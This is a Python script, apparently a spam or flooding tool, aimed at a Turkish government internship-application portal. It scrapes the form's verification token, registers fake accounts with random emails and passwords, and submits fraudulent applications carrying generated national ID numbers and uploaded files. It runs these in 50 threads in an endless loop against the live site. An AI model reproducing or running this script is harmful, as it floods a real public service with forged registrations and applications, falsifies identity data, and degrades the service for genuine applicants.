from concurrent.futures import thread
from unicodedata import name
import requests
from lxml import etree
import urllib
import random
from fake_headers import Headers
import threading
import json
from requests_toolbelt.multipart.encoder import MultipartEncoder
from tc import *

def hack():

    names=["halil","huseyin","burak","gurkan","ismail","dogukan","ahmet","mustafa","mahmut","sukru","sila","zeynep","dilara","fatma","emrah","mehmet"]
    surname=["tepedelen","aslan","erdogan","dogan","yaizi","tumsek","parlar","kayikci"]
    uzantı=["@gmail.com","@hotmail.com","@yahoo.com"]


    fake_email=random.choice(names)+random.choice(surname)+str(random.randint(0,999999))+random.choice(uzantı)

    fake_password=random.choice(names)+"@"+str(random.randint(1000,20000))

    header = Headers()

    header=header.generate()

    s = requests.Session()

    x_start = s.get('https://bizbizekariyer.tp.gov.tr/Account/Register')

    sessionCookies = x_start.cookies

    parser = etree.HTMLParser()
    tree = etree.fromstring(x_start.text, parser)
    verificationToken = tree.xpath('//form//input[@name="__RequestVerificationToken"]/@value')[0]

    data={
        "Email": fake_email,
        "Password": fake_password,
        "ConfirmPassword": fake_password,
        "UserType": "Staj",
        "__RequestVerificationToken":verificationToken

    }

    x = s.post('https://bizbizekariyer.tp.gov.tr/Account/Register',data=data,cookies=sessionCookies)

    #print(x.text)

    print("----------------------------")
    print(x.status_code)


    if x.text.find("Uygulamalı Eğitim Başvuru Yap") != -1 :

        print("[BAŞARILI GİRİŞ]")

        #UPDATE

    

        mp_encoder = MultipartEncoder(
            fields={
                'Donem': "2022",
                'Ad': "Mustafa",
                'Soyad': "Topaloğlu",
                'Fotograf': ('test1.png', open('test1.png', 'rb'), 'image/png',{'Expires': '0'}),
                'TCVatandasiMi': "Evet",
                'KimlikNo': "{}".format(tc_generator()),
                'DogumTarihi': "2.2.2000",
                'Cinsiyet': "E",
                'Tel': "05353721184",
                'IlID': "49",
                'IlceID': "594",
                'MahalleID': "46048",
                'Adres': "adresssssssssssssssss",
                'Okul': "009",
                'Bolum': "081",
                'Sinif': "4",
                'Ortalama': "3,3",
                'Staj.StajID': "84",
                'StajDetayID': "243",
                'StajDonemID': "104",
                'BaslamaTarihi': "24.10.2022",
                'BitisTarihi': "23.6.2023",
                'files': ('test2.pdf', open('test2.pdf', 'rb'), 'application/pdf',{'Expires': '0'}),
                '__RequestVerificationToken': verificationToken,
            
                
            }
        )

        try:
            r = s.post(
                'https://bizbizekariyer.tp.gov.tr/Basvuru/Basvuru',
                data=mp_encoder,  # The MultipartEncoder is posted as data, don't use files=...!
                # The MultipartEncoder provides the content-type header with the boundary:
                headers={'Content-Type': mp_encoder.content_type}
            )

        except:
            print("[CV ERROR]")


    else:
        print("[HATALI GİRİŞ]")

    print(fake_email)
    print(fake_password)

    print("----------------------------")


hack()




def hack_loop():

    while True:

        hack()


threads=[]

for i in range(50):

    t=threading.Thread(target=hack_loop)
    t.daemon=True

    threads.append(t)


for i in range(50):

    threads[i].start()

for i in range(50):

    threads[i].join()



